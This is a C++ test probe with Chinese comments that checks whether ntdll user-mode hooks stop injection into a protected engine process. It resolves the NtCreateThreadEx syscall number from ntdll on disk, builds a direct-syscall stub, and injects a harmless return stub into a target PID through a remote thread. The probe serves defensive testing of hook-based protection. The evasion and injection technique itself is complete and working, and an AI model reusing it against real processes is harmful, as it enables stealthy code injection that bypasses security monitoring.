//
// sysinject.cpp — 直 syscall 注入探针。
//
// 目的：验证「绕过 ntdll hook 之后能否注入引擎」——
//       用来回答「用户态 hook 到底算不算安全边界」。
//
// 用法: sysinject.exe <pid> [delayMs] [outFile]
//
// 与 injecttest 的唯一区别在最后一步：
//   injecttest 用 CreateRemoteThread（走 ntdll!NtCreateThreadEx → 会被 R3ShieldCore 的 hook 拦）
//   sysinject  从磁盘上的 ntdll.dll 解析出 NtCreateThreadEx 的 syscall 号，
//              自建 {mov r10,rcx; mov eax,ssn; syscall; ret} stub 直接陷入内核 ——
//              完全不走被 MinHook 打补丁的那个 ntdll 导出。
//
// 判读：若四步全过 → 被注入方无防护（hook 可绕），用户态 hook 不是安全边界。
//
#include <windows.h>
#include <stdarg.h>
#include <stdio.h>
#include <stdlib.h>

typedef LONG NTSTATUS;
typedef NTSTATUS(NTAPI* NtCreateThreadEx_t)(
	PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, PVOID ObjectAttributes,
	HANDLE ProcessHandle, PVOID StartRoutine, PVOID Argument, ULONG CreateFlags,
	SIZE_T ZeroBits, SIZE_T StackSize, SIZE_T MaximumStackSize, PVOID AttributeList);

static FILE* g_out = nullptr;

static void Emit(const char* fmt, ...)
{
	va_list ap;
	va_start(ap, fmt);
	vprintf(fmt, ap);
	va_end(ap);
	if (g_out) {
		va_start(ap, fmt);
		vfprintf(g_out, fmt, ap);
		va_end(ap);
		fflush(g_out);
	}
}

// 从磁盘上的 ntdll.dll 读出某个导出函数的 syscall 号。
// 靠的是 x64 stub 的固定前缀：4C 8B D1 (mov r10,rcx)  B8 xx xx xx xx (mov eax,ssn)。
static DWORD GetSyscallNumber(const char* funcName)
{
	HANDLE f = CreateFileW(L"C:\\Windows\\System32\\ntdll.dll", GENERIC_READ,
		FILE_SHARE_READ, nullptr, OPEN_EXISTING, 0, nullptr);
	if (f == INVALID_HANDLE_VALUE) {
		Emit("    [ssn] 打开磁盘 ntdll 失败 err=%u\n", GetLastError());
		return 0;
	}

	const DWORD size = GetFileSize(f, nullptr);
	BYTE* buf = static_cast<BYTE*>(malloc(size));
	DWORD read = 0;
	const BOOL ok = ReadFile(f, buf, size, &read, nullptr);
	CloseHandle(f);
	if (!ok || read != size) {
		Emit("    [ssn] 读取磁盘 ntdll 失败\n");
		free(buf);
		return 0;
	}

	const IMAGE_DOS_HEADER* dos = reinterpret_cast<const IMAGE_DOS_HEADER*>(buf);
	const IMAGE_NT_HEADERS* nt = reinterpret_cast<const IMAGE_NT_HEADERS*>(buf + dos->e_lfanew);
	const DWORD expRva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
	const DWORD expSize = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;
	if (expRva == 0) {
		free(buf);
		return 0;
	}
	const IMAGE_EXPORT_DIRECTORY* exp =
		reinterpret_cast<const IMAGE_EXPORT_DIRECTORY*>(buf + expRva);
	const DWORD* names = reinterpret_cast<const DWORD*>(buf + exp->AddressOfNames);
	const WORD* ords = reinterpret_cast<const WORD*>(buf + exp->AddressOfNameOrdinals);
	const DWORD* funcs = reinterpret_cast<const DWORD*>(buf + exp->AddressOfFunctions);

	DWORD ssn = 0;
	for (DWORD i = 0; i < exp->NumberOfNames; i++) {
		const char* n = reinterpret_cast<const char*>(buf + names[i]);
		if (strcmp(n, funcName) != 0) {
			continue;
		}
		const DWORD funcRva = funcs[ords[i]];
		if (funcRva < expRva || funcRva >= expRva + expSize) {
			const BYTE* p = buf + funcRva;
			if (p[0] == 0x4C && p[1] == 0x8B && p[2] == 0xD1 && p[3] == 0xB8) {
				ssn = *reinterpret_cast<const DWORD*>(p + 4);
			}
		}
		break;
	}

	free(buf);
	return ssn;
}

// 造一段可直接执行的 syscall stub：mov r10,rcx; mov eax,ssn; syscall; ret
static NtCreateThreadEx_t MakeSyscallStub(DWORD ssn)
{
	BYTE code[] = {
		0x4C, 0x8B, 0xD1,           // mov r10, rcx
		0xB8, 0x00, 0x00, 0x00, 0x00, // mov eax, imm32
		0x0F, 0x05,                 // syscall
		0xC3                        // ret
	};
	*reinterpret_cast<DWORD*>(code + 4) = ssn;

	BYTE* mem = static_cast<BYTE*>(VirtualAlloc(nullptr, sizeof(code),
		MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE));
	if (mem) {
		memcpy(mem, code, sizeof(code));
	}
	return reinterpret_cast<NtCreateThreadEx_t>(mem);
}

int main(int argc, char** argv)
{
	WCHAR self[MAX_PATH] = {};
	GetModuleFileNameW(nullptr, self, _countof(self));

	const DWORD pid = (argc > 1) ? static_cast<DWORD>(strtoul(argv[1], nullptr, 10)) : 0;
	const int delayMs = (argc > 2) ? atoi(argv[2]) : 0;
	if (argc > 3 && argv[3][0]) {
		g_out = fopen(argv[3], "w");
	}

	Emit("sysinject pid=%u\n", GetCurrentProcessId());
	Emit("镜像路径: %ls\n", self);
	Emit("目标 pid=%u  delay=%dms\n", pid, delayMs);

	if (pid == 0) {
		Emit("缺少目标 pid。\n");
		if (g_out) fclose(g_out);
		return 1;
	}
	if (delayMs > 0) {
		Sleep(static_cast<DWORD>(delayMs));
	}

	// 0) 解析 syscall 号 + 造 stub
	const DWORD ssn = GetSyscallNumber("NtCreateThreadEx");
	Emit("0) NtCreateThreadEx syscall 号    %u (0x%X)\n", ssn, ssn);
	if (ssn == 0) {
		Emit("   解析失败，退出。\n");
		if (g_out) fclose(g_out);
		return 1;
	}
	NtCreateThreadEx_t pSyscall = MakeSyscallStub(ssn);
	if (!pSyscall) {
		Emit("   stub 分配失败。\n");
		if (g_out) fclose(g_out);
		return 1;
	}
	Emit("   syscall stub @ %p\n", reinterpret_cast<void*>(pSyscall));

	const DWORD access = PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION |
		PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_QUERY_INFORMATION;

	// 1) 打开目标
	HANDLE h = OpenProcess(access, FALSE, pid);
	if (!h) {
		Emit("1) OpenProcess                  失败 err=%u\n", GetLastError());
		if (g_out) fclose(g_out);
		return 1;
	}
	Emit("1) OpenProcess                  成功\n");

	// 2) 分配
	void* remote = VirtualAllocEx(h, nullptr, 4096, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!remote) {
		Emit("2) VirtualAllocEx               失败 err=%u\n", GetLastError());
		CloseHandle(h);
		if (g_out) fclose(g_out);
		return 1;
	}
	Emit("2) VirtualAllocEx               成功 addr=%p\n", remote);

	// 3) 写 shellcode
	const unsigned char sc[] = { 0x33, 0xC0, 0xC3 };
	SIZE_T written = 0;
	if (!WriteProcessMemory(h, remote, sc, sizeof(sc), &written)) {
		Emit("3) WriteProcessMemory           失败 err=%u\n", GetLastError());
		VirtualFreeEx(h, remote, 0, MEM_RELEASE);
		CloseHandle(h);
		if (g_out) fclose(g_out);
		return 1;
	}
	Emit("3) WriteProcessMemory           成功\n");

	// 4) 直 syscall 建远程线程
	HANDLE th = nullptr;
	const NTSTATUS st = pSyscall(&th, 0x1FFFFF, nullptr, h, remote, nullptr, 0, 0, 0, 0, nullptr);
	Emit("4) NtCreateThreadEx(直syscall)  NTSTATUS=0x%08X %s\n",
		static_cast<unsigned>(st), st >= 0 ? "成功" : "失败");
	if (th) {
		WaitForSingleObject(th, 3000);
		CloseHandle(th);
	}

	// 5) 目标状态
	HANDLE q = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
	if (q) {
		DWORD code = 0;
		GetExitCodeProcess(q, &code);
		Emit("5) 目标状态                     %s\n", (code == STILL_ACTIVE) ? "仍在运行" : "已退出");
		CloseHandle(q);
	} else {
		Emit("5) 目标状态                     已不存在\n");
	}

	VirtualFreeEx(h, remote, 0, MEM_RELEASE);
	CloseHandle(h);
	Emit("完成。\n");
	if (g_out) fclose(g_out);
	return 0;
}
